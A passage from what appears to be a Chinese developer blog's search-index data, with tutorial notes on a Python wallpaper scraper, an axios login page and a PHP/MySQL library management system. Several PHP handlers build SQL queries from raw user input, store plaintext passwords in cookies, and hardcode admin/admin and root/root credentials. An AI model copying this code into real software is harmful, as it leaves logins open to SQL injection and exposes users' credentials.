f&quot;https://w.wallhaven.cc/full/&#123;tou&#125;/wallhaven-&quot; + lian imgs.append(img_url) return imgs# 将返回的图片url保存到一个列表，返回一个列表def download_image(imgs, path): # 传递图片url的列表 for img_url in imgs: resp = requests.get(img_url, headers=header) timestamp = int(time.time()) filename = f&quot;&#123;timestamp&#125;.jpg&quot; # 使用时间戳命名图片，让图片名称不会重复 fullpath = os.path.join(path, filename) # 将图片路径和图片名称拼接起来 with open(fullpath, &quot;wb&quot;) as f: # 保存到想要保存的路径 f.write(resp.content)def index(): print(&quot;欢迎使用壁纸下载器&quot;) word = input(&quot;请输入你想要查询的壁纸的关键词(英文):&quot;) path = input(&quot;请输入你要保存的路径:&quot;) page = input(&quot;请输入你要下载的页数:&quot;) urls = searcher_url(word, int(page) + 1) # 将搜索到的列表返回，这个值是一个列表 return [urls, word, path] # 返回一个列表if __name__ == &#x27;__main__&#x27;: result = index() urls = result[0] word = result[1] path = result[2] with ThreadPoolExecutor(max_workers=5) as executor: # 线程池，每次最多运行5个线程 for url in urls: # 迭代搜索返回的urls, print(url) html = get_html(url) img_url = get_image_url(html) executor.submit(download_image, img_url, path) # 将download_image函数传入线程池，并执行 print(&quot;下载完成&quot;)","categories":[{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"axios交互","slug":"axios交互","date":"2023-12-25T02:46:59.000Z","updated":"2023-12-25T02:58:32.194Z","comments":true,"path":"2023/12/25/axios交互/","link":"","permalink":"http://zhoumuyun.com/2023/12/25/axios%E4%BA%A4%E4%BA%92/","excerpt":"此篇介绍了axios交互的初始化","text":"此篇介绍了axios交互的初始化 初始化12345678910111213&lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;&lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue(&#123; el: &#x27;#app&#x27;, data: function () &#123; return &#123; visible: false, &#125; &#125;,&#125;) 调用axios方法获取参数 将login登录按钮设置为一个函数，用axios发送post请求包，将登录数据发到后台api, .then((response) 代表成功后，将返回的数据包response发送到控制台。如果控制台的数据里面有success数据，就说明发送成功， window.location.href &#x3D; “http://192.168.2.78/2.php“; 然后界面直接跳到这个文件 否则就报错 1234567891011121314151617181920methods: &#123; login: function () &#123; axios.post(&#x27;http://192.168.2.78/api.php&#x27;, this.userData) .then((response) =&gt; &#123; console.log(response); if (response.data.includes(&#x27;success&#x27;)) &#123; window.location.href = &quot;http://192.168.2.78/2.php&quot;; &#125; else &#123; this.open4(); &#125; &#125; &#125; &#125;, open4: function () &#123; this.$notify.error(&#123; title: &#x27;错误&#x27;, message: &#x27;账号密码错误&#x27; &#125;); &#125; 图书管理系统初始化12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;图书管理系统&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt; &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;div class=&quot;login1&quot;&gt; &lt;div class=&quot;login2&quot;&gt; &lt;i class=&quot;el-icon-burger&quot;&gt;&lt;/i&gt; &lt;h1&gt;图书管理系统&lt;/h1&gt; &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.username&quot; clearable&gt;&lt;/el-input&gt; &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.password&quot; clearable show-password&gt;&lt;/el-input&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;login&quot;&gt;登录&lt;/el-button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;style&gt; .el-icon-burger &#123; font-size: 100px; &#125; .login2 &#123; text-align: center; justify-content: center; height: 20vh; width: 20vw; &#125; .login1 &#123; display: flex; flex-direction: column; align-items: center; &#125; &lt;/style&gt; &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue(&#123; el: &#x27;#app&#x27;, data: function () &#123; return &#123; visible: false, userData: &#123; username: &#x27;&#x27;, password: &#x27;&#x27;, &#125; &#125; &#125;, methods: &#123; login: function () &#123; axios.post(&#x27;http://192.168.2.78/api.php&#x27;, this.userData) .then((response) =&gt; &#123; console.log(response); if (response.data.includes(&#x27;success&#x27;)) &#123; window.location.href = &quot;http://192.168.2.78/2.php&quot;; &#125; else &#123; this.open4(); &#125; &#125; ) &#125;, open4: function () &#123; this.$notify.error(&#123; title: &#x27;错误&#x27;, message: &#x27;账号密码错误&#x27; &#125;); &#125; &#125; &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; api接受文件初始化添加三个header1234header(&quot;Access-Control-Allow-Origin: *&quot;);header(&quot;Access-Control-Allow-Methods:GET, POST, OPTIONS, PUT, DELETE&quot;);header(&quot;Access-Control-Allow-Headers:Content-Type, Access-Control-Allow-Headers,Authorization,X-Requested-With&quot;); 连接数据库12$link = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;Error connecting&quot;);mysqli_query($link, &quot;set name utf8&quot;); 将数据请求的uri和mothod用两个变量接受12$requestPath = $_SERVER[&quot;REQUEST_URI&quot;];$requsetMethod = $_SERVER[&quot;REQUEST_METHOD&quot;]; 判断方法和路径12345678910111213如果请求的方法是post,请求的目标uri是api.phpfile_get_contents(&quot;php://input&quot;) 是 PHP 中的一个函数，用于读取请求的原始数据。php://input 是一个只读流，可以访问请求的原始数据。这个函数常常用于获取 POST 请求的数据。当你的 PHP 脚本收到一个 POST 请求时，file_get_contents(&quot;php://input&quot;) 可以用来读取请求体中的数据将接受到的语句转化为jsonif ($input === null) &#123; header(&#x27;HTTP/1.1 404 Not Found&#x27;); echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);进行判断，如果input里里面为空，就输出错误信息 $username = $input[&#x27;username&#x27;]; $password = $input[&#x27;password&#x27;];将接受的信息提取里面的username和password,用两个变量接受 $sql = &quot;select username, password from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; LIMIT 0,1&quot;;找username和password在user表里面，而且是username，password等于上面的接受到的参数的第一行 1234567891011121314151617181920212223if ($requsetMethod === &quot;POST&quot; &amp;&amp; $requestPath === &#x27;/api.php&#x27;) &#123; $inputJSON = file_get_contents(&quot;php://input&quot;); $input = json_decode($inputJSON, true); if ($input === null) &#123; header(&#x27;HTTP/1.1 404 Not Found&#x27;); echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]); &#125; else &#123; $username = $input[&#x27;username&#x27;]; $password = $input[&#x27;password&#x27;]; $sql = &quot;select username, password from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; LIMIT 0,1&quot;; $result = mysqli_query($link, $sql); if (mysqli_num_rows($result) &gt; 0) &#123; echo &quot;success&quot;; &#125; else &#123; echo &quot;账号密码错误&quot;; &#125; &#125;&#125; 表的结构&lt;el-button type&#x3D;”primary” @click&#x3D;”dialogVisible &#x3D; true”&gt;修改用户 当你点击修改用户的时候，会触发dialogVisible函数，会出现弹框 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt; &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;div&gt; &lt;template&gt; &lt;el-row&gt; &lt;el-col span=&#x27;6&#x27;&gt; &lt;el-input placeholder=&quot;请输入你要查找的内容&quot; v-model=&quot;input&quot; clearable&gt;&lt;/el-input&gt; &lt;/el-col&gt; &lt;el-col span=&#x27;4&#x27;&gt; &lt;el-button type=&quot;primary&quot;&gt;搜索&lt;/el-button&gt; &lt;/el-col&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;dialogVisible = true&quot;&gt;新增&lt;/el-button&gt; &lt;/el-row&gt; &lt;el-table :data=&quot;users&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot;&gt; &lt;el-table-column prop=&quot;id&quot; label=&quot;ID&quot; width=&quot;180&quot;&gt;&lt;/el-table-column&gt; &lt;el-table-column prop=&quot;username&quot; label=&quot;用户姓名&quot; width=&quot;180&quot;&gt;&lt;/el-table-column&gt; &lt;el-table-column prop=&quot;password&quot; label=&quot;密码&quot;&gt;&lt;/el-table-column&gt; &lt;el-table-column&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;dialogVisible = true&quot;&gt;修改用户&lt;/el-button&gt; &lt;el-button type=&quot;text&quot; @click=&quot;open&quot;&gt;&lt;el-button type=&quot;primary&quot;&gt;删除用户&lt;/el-button&gt;&lt;/el-button&gt; &lt;/el-table-column&gt; &lt;/el-table&gt; &lt;el-dialog title=&quot;新增用户&quot; :visible.sync=&quot;dialogVisible&quot;&gt; &lt;el-form :model=&quot;newUser&quot;&gt; &lt;el-form-item label=&quot;用户名&quot; :rules=&quot;[&#123; required: true, message: &#x27;请输入用户名&#x27;, trigger: &#x27;blur&#x27; &#125;]&quot;&gt; &lt;el-input v-model=&quot;newUser.username&quot;&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;el-form-item label=&quot;密码&quot; :rules=&quot;[&#123; required: true, message: &#x27;请输入密码&#x27;, trigger: &#x27;blur&#x27; &#125;]&quot;&gt; &lt;el-input v-model=&quot;newUser.password&quot;&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;/el-form&gt; &lt;div slot=&quot;footer&quot; class=&quot;dialog-footer&quot;&gt; &lt;el-button @click=&quot;dialogVisible = false&quot;&gt;取 消&lt;/el-button&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;createUser&quot;&gt;确 定&lt;/el-button&gt; &lt;/div&gt; &lt;/el-dialog&gt; &lt;/template&gt; &lt;/div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; var app = new Vue(&#123; el: &#x27;#app&#x27;, data: function () &#123; return &#123; visible: false, users: [], showForm: false, newUser: &#123;&#125;, dialogVisible: false, currentUser: null, &#125; &#125;, methods: &#123; createUser() &#123; axios.post(&#x27;http://192.168.2.78/users.php&#x27;, this.newUser) .then(response =&gt; &#123; this.users.push(response.data); this.dialogVisible = false; &#125;) .catch(error =&gt; &#123; console.log(error); &#125;); &#125;, updateUser(user) &#123; // 现在将 user 参数传递给此方法 axios.post(`http://192.168.2.78/users.php?id=$&#123;user.id&#125;`, user) .then(response =&gt; &#123; let index = this.users.findIndex(u =&gt; u.id === user.id); if (index !== -1) &#123; this.users[index] = user; &#125; this.dialogVisible = false; &#125;) .catch(error =&gt; &#123; console.log(error); &#125;); &#125;, deleteUser(user) &#123; axios.post(&#x27;users.php&#x27;, &#123; action: &#x27;delete&#x27;, id: user.id &#125;) .then(response =&gt; &#123; if (response.data.status === &#x27;success&#x27;) &#123; this.users = this.users.filter(u =&gt; u.id !== user.id); &#125; else &#123; alert(&#x27;删除成功&#x27;); &#125; &#125;) .catch(error =&gt; &#123; console.error(&#x27;删除出错: &#x27;, error); &#125;); &#125;, getUsers: function () &#123; axios.get(&#x27;http://192.168.2.78/users.php&#x27;) .then((response) =&gt; &#123; this.users = response.data; &#125;) .catch((error) =&gt; &#123; console.log(error); &#125;); &#125;,editUser(user) &#123; this.currentUser = user; this.dialogVisible = true; &#125;, handleOpen(key, keyPath) &#123; console.log(key, keyPath); &#125;, handleClose(key, keyPath) &#123; console.log(key, keyPath); &#125;, tableRowClassName(&#123; row, rowIndex &#125;) &#123; return rowIndex % 2 === 0 ? &#x27;warning-row&#x27; : &#x27;success-row&#x27;; &#125;, open() &#123; this.$confirm(&#x27;此操作将永久删除该用户, 是否继续?&#x27;, &#x27;提示&#x27;, &#123; confirmButtonText: &#x27;确定&#x27;, cancelButtonText: &#x27;取消&#x27;, type: &#x27;warning&#x27;, center: true &#125;).then(() =&gt; &#123; this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;删除成功!&#x27; &#125;); &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &#x27;已取消删除&#x27; &#125;); &#125;); &#125; &#125;, created: function () &#123; this.getUsers(); &#125; &#125;) &lt;/script&gt; &lt;style&gt; .warning-row &#123; background: oldlace; &#125; .success-row &#123; background: #f0f9eb; &#125; .el-table .warning-row &#123; background: oldlace; &#125; .el-table .success-row &#123; background: #f0f9eb; &#125; &lt;/style&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"前端笔记","slug":"前端笔记","permalink":"http://zhoumuyun.com/categories/%E5%89%8D%E7%AB%AF%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"图书管理系统","slug":"图书管理系统","date":"2023-12-16T14:17:44.000Z","updated":"2023-12-16T15:09:04.700Z","comments":true,"path":"2023/12/16/图书管理系统/","link":"","permalink":"http://zhoumuyun.com/2023/12/16/%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/","excerpt":"此篇介绍了图书管理系统的搭建","text":"此篇介绍了图书管理系统的搭建 登录首页界面这个代码用css和HTML形成了一个好看的登录界面 页面有用户名，密码，还有注册功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;欢迎来到图书馆&lt;/title&gt; &lt;style&gt; body &#123; margin: 0; padding: 0; font-family: Roboto; background-repeat: no-repeat; background-size: cover; background: linear-gradient(120deg, #007bff, #d0314c); height: 100vh; overflow: hidden; &#125; .center &#123; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 29vw; background: white; border-radius: 10px; &#125; .center h1 &#123; text-align: center; padding: 0 0 20px 0; border-bottom: 1px solid silver; &#125; .center form &#123; padding: 0 40px; box-sizing: border-box; &#125; form .txt_field &#123; position: relative; border-bottom: 2px solid #adadad; margin: 30px 0; &#125; .txt_field input &#123; width: 100%; padding: 0 5px; height: 40px; font-size: 16px; border: none; background: none; outline: none; &#125; .txt_field label &#123; position: absolute; top: 50%; left: 5px; color: #adadad; transform: translateY(-50%); font-size: 16px; pointer-events: none; &#125; .txt_field span::before &#123; content: &#x27;&#x27;; position: absolute; top: 40px; left: 0; width: 0px; height: 2px; background: #2691d9; transition: .5s; &#125; .txt_field input:focus~label, .txt_field input:valid~label &#123; top: -5px; color: #2691d9; &#125; .txt_field input:focus~span::before, .txt_field input:Valid~span::before &#123; width: 100%; &#125; .pass &#123; margin: -5px 0 20px 5px; color: #a6a6a6; cursor: pointer; &#125; .pass:hover &#123; text-decoration: underline; &#125; input[type=&quot;Submit&quot;] &#123; width: 100%; height: 50px; border: 1px solid; border-radius: 25px; font-size: 18px; font-weight: 700; cursor: pointer; &#125; input[type=&quot;Submit&quot;]:hover &#123; background: #2691d9; color: #e9f4fb; transition: .5s; &#125; .signup_link &#123; margin: 30px 0; text-align: center; font-size: 16px; color: #666666; &#125; .signup_link a &#123; color: #2691d9; text-decoration: none; &#125; .signup_link a:hover &#123; text-decoration: underline; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;center&quot;&gt; &lt;form method=&quot;post&quot; action=&quot;link.php&quot;&gt; &lt;h1&gt;欢迎来到图书馆&lt;/h1&gt; &lt;div class=&quot;txt_field&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; required&gt; &lt;span&gt;&lt;/span&gt; &lt;label&gt;用户名&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;txt_field&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; required&gt; &lt;span&gt;&lt;/span&gt; &lt;label&gt;密码&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;pass&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;remeber&quot; value=&quot;yes&quot;&gt;记住密码 &lt;/div&gt; &lt;div class=&quot;signup_link&quot;&gt; 还没有账号？&lt;a href=&quot;register.php&quot;&gt;注册&lt;/a&gt; &lt;/div&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 注册界面与register_process.php相关联，注册的信息将会导入数据库，可以通过index界面登录 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;注册新用户&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt; &lt;style&gt; body &#123; background-color: #f0f0f0; color: #333; font-family: Arial, sans-serif; background-color: #e0f7fa; &#125; input[type=&quot;text&quot;], input[type=&quot;password&quot;] &#123; width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; &#125; input[type=&quot;submit&quot;] &#123; background-color: #4CAF50; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; box-shadow: 0 9px #999; &#125; input[type=&quot;submit&quot;]:hover &#123; background-color: #45a049; box-shadow: 0 5px #666; transform: translateY(4px); &#125; .center &#123; margin: auto; width: 50%; border: 3px solid #73AD21; padding: 20px; box-shadow: 10px 10px 5px grey; border-radius: 25px; background-color: #ffffff; &#125; label &#123; font-size: 1.2em; color: #333; padding: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;html&gt;&lt;body&gt; &lt;div class=&quot;center&quot;&gt; &lt;form method=&quot;post&quot; action=&quot;register_process.php&quot;&gt; &lt;h1&gt;注册新用户&lt;/h1&gt; &lt;div class=&quot;txt_field&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; required&gt; &lt;span&gt;用户名&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;txt_field&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; required&gt; &lt;span&gt;密码&lt;/span&gt; &lt;/div&gt; &lt;input type=&quot;submit&quot; name=&quot;register&quot; value=&quot;注册&quot;&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 注册后台php连接表单，获取表单数据，生成插入语句，将数据插入到数据库中 1234567891011121314151617&lt;?php// 连接数据库$db = mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;security&#x27;) or exit(&quot;Error connecting&quot;);// 获取表单数据$username = mysqli_real_escape_string($db, $_POST[&#x27;username&#x27;]);$password = mysqli_real_escape_string($db, $_POST[&#x27;password&#x27;]);// 将数据插入到数据库中$query = &quot;INSERT INTO users (username, password) VALUES(&#x27;$username&#x27;, &#x27;$password&#x27;)&quot;;mysqli_query($db, $query);echo &quot;注册成功&quot;;// 重定向用户到登录页面header(&#x27;location: index.php&#x27;);?&gt; 连接管理系统和展示页面的php如果是admin就进入后台管理系统，如果不是管理员就普通用户登录 12345678910111213141516171819202122232425262728&lt;?phpsession_start();header(&#x27;content-type:text/html;charset=utf-8&#x27;);//isset 判断有没有值 trim 可以把字符串的所有空格去掉if (isset($_POST[&#x27;submit&#x27;])) &#123; $u = trim($_POST[&#x27;username&#x27;]); $p = trim($_POST[&#x27;password&#x27;]); $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;Error connecting&quot;);//将这个链接赋值给link mysqli_query($link, &quot;set name utf8&quot;); $sql = &quot;select * from users where username = &#x27;$u&#x27; and password = &#x27;$p&#x27;&quot;; $result = mysqli_query($link, $sql); //在mysql的变量$link里面执行$sql命令 if(mysqli_num_rows($result) &gt; 0) &#123; # 查询数据库行有没有这个结果，如果大于1就进入 $_SESSION[&#x27;username&#x27;] = $u; setcookie(&#x27;password&#x27;, $p, time() + 7 * 12 * 6,&#x27;/&#x27;);#依次是 名称、想要存储在 Cookie 中的值、Unix 时间戳 Cookie 的过期时间 if($u==&#x27;admin&#x27; &amp;&amp; $p==&#x27;admin&#x27;)&#123; #判断是不是admin用户，如果是admin就进入后台管理，如果不是就进入图书展示界面 header(&#x27;location:inindex.php&#x27;);#定位到后台管理系统 &#125; else &#123; header(&#x27;Location:new.php&#x27;); #然后定位到new.php exit();&#125;#然后退出 &#125; else &#123; echo &#x27;&lt;br&gt;&#x27;;#在数据库查询没有账号密码就会退出 echo &#x27;用户名或密码错误!请重新输入!&#x27;; &#125;&#125;?&gt; 图书展示界面这个界面有注销账号，图书展示，借阅展示，和搜索图书功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;清华大学图书馆&lt;/title&gt; &lt;style&gt; html, body &#123; width: 100%; margin: 0; padding: 0; background-color: #d3d3d3; &#125; .header &#123; background-color: #475767; text-align: center; color: white; &#125; .nav &#123; display: flex; justify-content: space-around; background-color: #475767; color: white; padding: 10px 0; &#125; .main &#123; display: flex; width: 100%; background-color: #d3d3d3; &#125; .sidebar, .content &#123; width: 100%; &#125; .sidebar &#123; background-color: #475767; padding: 10px; color: white; display: flex; flex-direction: column; justify-content: space-around; &#125; .content &#123; background-color: #f08844; &#125; .nav button, .sidebar button &#123; background-color: #008CBA; padding: 12px 24px; font-size: 16px; border-radius: 12px; transition-duration: 0.4s; border: none; &#125; .nav button:hover, .sidebar button:hover &#123; background-color: #4CAF50; color: white; &#125; .nav, .main, .sidebar &#123; display: flex; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;header class=&quot;header&quot;&gt; &lt;h1&gt;清华大学图书馆&lt;/h1&gt; &lt;div&gt;当前登录用户: &lt;?php echo $_SESSION[&quot;username&quot;]; ?&gt; &lt;/div&gt; &lt;/header&gt; &lt;nav class=&quot;nav&quot;&gt; &lt;button&gt;首页&lt;/button&gt; &lt;button&gt;排行榜&lt;/button&gt; &lt;button&gt;作家&lt;/button&gt; &lt;button&gt;我的书架&lt;/button&gt; &lt;form method=&quot;post&quot; action=&quot;search.php&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;search&quot; placeholder=&quot;搜索&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt; &lt;form method=&quot;post&quot; action=&quot;borrow_book.php&quot;&gt; &lt;label for=&quot;book_id&quot;&gt;图书ID:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; id=&quot;book_id&quot; name=&quot;book_id&quot;&gt;&lt;br&gt; &lt;label for=&quot;user_id&quot;&gt;用户ID:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; id=&quot;user_id&quot; name=&quot;user_id&quot;&gt;&lt;br&gt; &lt;label for=&quot;borrow_date&quot;&gt;借书日期:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;date&quot; id=&quot;borrow_date&quot; name=&quot;borrow_date&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;借书&quot;&gt; &lt;/form&gt; &lt;table id=&quot;borrow_records&quot;&gt; &lt;tr&gt; &lt;th&gt;图书ID&lt;/th&gt; &lt;th&gt;用户名&lt;/th&gt; &lt;th&gt;借书日期&lt;/th&gt; &lt;/tr&gt; &lt;?php include &#x27;fetch_borrow_records.php&#x27;; ?&gt; &lt;/table&gt; &lt;/nav&gt; &lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;sidebar&quot;&gt; &lt;h2&gt;图书书库&lt;/h2&gt; &lt;button&gt;人气小说&lt;/button&gt; &lt;button&gt;人文社科&lt;/button&gt; &lt;button&gt;品质生活&lt;/button&gt; &lt;button&gt;经济管理&lt;/button&gt; &lt;button&gt;文学作品&lt;/button&gt; &lt;button&gt;文化艺术&lt;/button&gt; &lt;button&gt;自然科学&lt;/button&gt; &lt;button&gt;网络安全&lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;img src=&quot;微信图片_20231214170052.png&quot; alt=&quot;tupian&quot;&gt; &lt;!-- Content goes here --&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php date_default_timezone_set(&#x27;Asia/Shanghai&#x27;); // 设置时区为上海 echo date(&#x27;Y-m-d H:i:s&#x27;); // 输出格式为 &quot;2023-12-14 15:42:32&quot; if (isset($_SESSION[&quot;username&quot;])) &#123; echo &quot;&quot; . $_SESSION[&quot;username&quot;] . &quot;登录成功&quot;; exit(); &#125; if (isset($_GET[&#x27;logout&#x27;])) &#123; #如果获取的值是logout，就会判断成功 session_unset(); session_destroy(); #将sesion里的cookies注销销毁 echo &quot;你已成功注销&quot;; header(&#x27;Location:index.php&#x27;); #然后定位到主界面 &#125; echo &quot;&lt;h1&gt;&lt;a href=?logout=true&gt;注销&lt;/a&gt;&lt;/h1&gt;&quot;; #设置logout的按键 ?&gt;&lt;/body&gt;&lt;/html&gt; 搜索系统 12345678910111213141516171819&lt;?php$search = $_POST[&#x27;search&#x27;];$link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;);mysqli_query($link, &quot;set names utf8&quot;);$search = mysqli_real_escape_string($link, $search);$query = &quot;SELECT * FROM books WHERE name LIKE &#x27;%$search%&#x27; OR author LIKE &#x27;%$search%&#x27;&quot;;$result = mysqli_query($link, $query);if ($result) &#123; while ($row = mysqli_fetch_assoc($result)) &#123; echo &quot;书籍名字: &quot; . $row[&#x27;name&#x27;] . &quot;&lt;br&gt;&quot;; echo &quot;作者: &quot; . $row[&#x27;author&#x27;] . &quot;&lt;br&gt;&quot;; echo &quot;出版年份: &quot; . $row[&#x27;year&#x27;] . &quot;&lt;br&gt;&lt;br&gt;&quot;; &#125;&#125; else &#123; echo &quot;搜索失败&quot;;&#125;mysqli_close($link);?&gt; 借阅系统 12345678910111213141516171819202122232425262728293031&lt;?php $conn = mysqli_connect(&#x27;127.0.0.1&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;security&#x27;); if (!$conn) &#123; die(&quot;连接失败: &quot; . mysqli_connect_error()); &#125; if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; $book_id = $_POST[&#x27;book_id&#x27;]; $username = $_POST[&#x27;username&#x27;]; $borrow_date = $_POST[&#x27;borrow_date&#x27;]; $sql = &quot;INSERT INTO borrow_records (book_id, username, borrow_date) VALUES (&#x27;$book_id&#x27;, &#x27;$username&#x27;, &#x27;$borrow_date&#x27;)&quot;; if (mysqli_query($conn, $sql)) &#123; echo &quot;图书借阅成功&quot;; // 查询该用户的借书记录 $query = &quot;SELECT * FROM borrow_records WHERE username = &#x27;$username&#x27;&quot;; $result = mysqli_query($conn, $query); if (mysqli_num_rows($result) &gt; 0) &#123; // 输出每一条借书记录 while($row = mysqli_fetch_assoc($result)) &#123; echo &quot;图书ID: &quot; . $row[&quot;book_id&quot;]. &quot; - 用户名: &quot; . $row[&quot;username&quot;]. &quot; - 借书日期: &quot; . $row[&quot;borrow_date&quot;]. &quot;&lt;br&gt;&quot;; &#125; &#125; else &#123; echo &quot;没有借书记录&quot;; &#125; &#125; else &#123; echo &quot;错误: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn); &#125; &#125; mysqli_close($conn);?&gt; 借书记录展示 123456789101112131415161718&lt;?php$conn = mysqli_connect(&#x27;127.0.0.1&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;security&#x27;);if (!$conn) &#123; die(&quot;连接失败: 